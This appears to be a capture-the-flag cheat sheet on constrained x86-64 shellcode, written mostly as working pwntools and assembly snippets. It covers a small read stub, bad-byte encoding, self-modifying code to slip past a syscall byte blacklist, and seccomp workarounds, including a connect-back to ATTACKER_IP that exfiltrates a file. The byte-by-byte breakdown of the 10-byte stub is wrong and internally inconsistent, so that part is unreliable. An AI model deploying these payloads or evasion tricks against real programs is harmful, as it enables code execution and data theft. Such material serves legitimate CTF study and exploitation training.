# Constrained Shellcode

## Small Space (<= 10 bytes)

**When:** The shellcode buffer is extremely small (10 bytes or so) but executable.

**How it works:** Use the first stage as a "read stub" that reads a larger payload from stdin. Every byte must be non-null.

```python
# 10-byte read stub: read(0, rsp, len); jmp rsp
# Assembly: push rsp; pop rsi; cdq; syscall; jmp rsp
# Bytes:     R^   A   S   ZH   1  \xff  \x0f  \x05
stage1 = b'R^ASZH1\xff\x0f\x05'  # push rsp; pop rsi; cdq; syscall; jmp rsp
io.sendafter(b":", stage1)
sleep(0.5)
io.sendline(asm(shellcraft.sh()))  # stage 2
```

**Breakdown of stage1 bytes:**

- `R` = push rsp (0x54)
- `^` = pop rsi (0x5e) - rsi = rsp (write buffer)
- `A` = 0x41, part of next instruction encoding
- `S` = 0x53, part of next
- `ZH` = cdq (0x99) - sign-extend rax into rdx:rdx (rdx = 0 because rax = read return value > 0)
- `1` = 0x31, part of syscall encoding
- `\xff\x0f\x05` = syscall (0x0f 0x05) preceded by inc encoding that resolves to the right bytes

## Bad Byte Filter

**When:** The program scans for banned bytes before executing.

```python
bad = b"\x00\x0a\x0d\x20"  # null, newline, carriage return, space
assert not any(c in sc for c in bad)

# pwntools encoder to avoid specific bytes
sc = encoders.encode(sc, avoid=b"\x0f\x05\xcd")
io.sendlineafter(b":", sc)
```

**Note:** pwntools encoder is not perfect. Test your shellcode locally first.

## Bypass syscall Hex Blacklist

**When:** Bytes `0x0f` and `0x05` (the `syscall` instruction) are blocked. Shellcode must construct the syscall at runtime by modifying bytes already in memory.

**How it works:** Place two placeholder bytes in the shellcode (e.g., `0x10 0x06`), then decrement them to `0x0f 0x05` at runtime.

```asm
dec byte ptr [rip + syscall]      # 0x10 -> 0x0f
dec byte ptr [rip + syscall + 1]  # 0x06 -> 0x05
syscall: .byte 0x10, 0x06         # placeholder
```

Or with `inc` (if 0x0e, 0x04 are not blocked):

```asm
inc byte ptr [rip + syscall]
inc byte ptr [rip + syscall + 1]
syscall: .byte 0x0e, 0x04
```

## ORW Shellcode

**When:** `execve` blocked by seccomp, but `open`/`read`/`write` are allowed.

```python
sc = asm(shellcraft.open("/flag.txt") +
         shellcraft.read("rax", "rsp", 0x100) +
         shellcraft.write(1, "rsp", 0x100))
```

Flow: `open("flag.txt")` -> fd in rax -> `read(fd, rsp, 0x100)` -> `write(stdout, rsp, 0x100)`

## ORW with Socket (No read/write)

**When:** `read` and `write` are blocked but `open`, `mmap`, `connect`, `sendto` work.

**How it works:** Open the flag file, mmap it into memory, connect back to an attacker server, and send the file content via `sendto`.

```python
sc = asm(
    shellcraft.open('flag.txt') +
    'mov r12, rax\n' +                     # save fd in r12
    shellcraft.mmap(0, 0x1000, 'PROT_READ', 'MAP_PRIVATE', 'r12', 0) +
    'mov r15, rax\n' +                     # save mapped addr in r15
    shellcraft.connect(ATTACKER_IP, ATTACKER_PORT) +
    'mov r14, rbp\n' +                     # socket fd from connect
    shellcraft.sendto('r14', 'r15', 0x1000, 0, 0)
)
```

## ORW without read/write (simpler: sendfile)

**When:** `read`/`write` are blocked but `sendfile` is not in the blocked list. Common pattern: seccomp blocks every variant of `read`/`write` but forgets `sendfile`.

**How it works:** `sendfile(1, fd, NULL, count)` copies data from one file descriptor to another (here stdout). No mmap or socket needed.

```python
sc = asm('''
    /* open("flag.txt", O_RDONLY) */
    lea rdi, [rip + flag_path]
    xor esi, esi
    mov eax, 2
    syscall
    /* sendfile(1, fd, NULL, 0x1000) */
    mov edi, 1             /* stdout */
    mov rsi, rax           /* fd from open */
    xor edx, edx           /* offset = NULL */
    mov r10d, 0x1000       /* count */
    mov eax, 40            /* SYS_sendfile */
    syscall
    /* exit(0) */
    xor edi, edi
    mov eax, 60
    syscall
flag_path: .asciz "flag.txt"
''')
```
